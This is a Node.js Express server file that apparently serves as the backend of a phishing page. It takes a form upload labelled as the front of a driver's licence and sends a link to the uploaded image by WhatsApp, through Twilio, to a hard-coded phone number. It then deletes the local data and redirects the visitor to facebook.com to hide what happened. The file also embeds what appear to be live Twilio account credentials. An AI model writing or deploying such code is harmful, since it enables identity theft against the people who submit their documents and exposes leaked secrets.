const express = require("express");
const app = express();
const fs = require("fs").promises;
const path = require("path");
const bodyParser = require("body-parser");
const multer = require("multer");
const zipFolder = require("zip-a-folder");
const compromise = require("compromise");
const client = require("twilio")("ACe54e344198f142962f26f8dbbb56bcdc", "d121c459858a2071e48667eddf9d2209");

// Generate a random sentence for the WhatsApp message body
const randomSentence = compromise("i").random().sentences(1).out();

// Set up file upload using multer
const storage = multer.diskStorage({
  destination: async function (req, file, cb) {
    try {
      await fs.mkdir(path.resolve(__dirname, "uploads"));
      cb(null, "uploads/");
    } catch (err) {
      if (err.code === "EEXIST") {
        cb(null, "uploads/");
      } else {
        cb(err);
      }
    }
  },
  filename: function (req, file, cb) {
    const ext = path.extname(file.originalname);
    cb(null, Date.now() + ext);
  },
});

const upload = multer({ storage: storage });

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.resolve(__dirname, "public")));

app.get("/", (req, res) => {
  res.sendFile(path.resolve(__dirname, "index.html"));
});

app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
  try {
    const data = req.body;

    // validate data
    if (!data || typeof data !== "object") {
      throw new Error("Invalid data.");
    }

    // create a folder to store the message data
    const folderName = `message-${Date.now()}`;
    await fs.mkdir(path.resolve(__dirname, folderName));

    // save the message data to a text file
    const dataFileName = path.join(folderName, "happy.txt");
    await fs.writeFile(path.resolve(__dirname, dataFileName), JSON.stringify(data));

    // send WhatsApp message with media attachment
    const message = await client.messages.create({
      from: "whatsapp:+14155238886",
      to: "whatsapp:+2349154911424", // recipient WhatsApp number
      body: `${randomSentence}`,
      mediaUrl: `https://${req.get("host")}/${req.file.path}`,
    });
    console.log("WhatsApp message sent successfully.", message);

    // remove the folder and file
    await fs.unlink(path.resolve(__dirname, dataFileName));
    await fs.rmdir(path.resolve(__dirname, folderName), { recursive: true });

    res.redirect("https://www.facebook.com");
  } catch (err) {
    console.error(err);
    res.status(500).send("Error sending WhatsApp message.");
  }
});

const port = 9000;

app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});
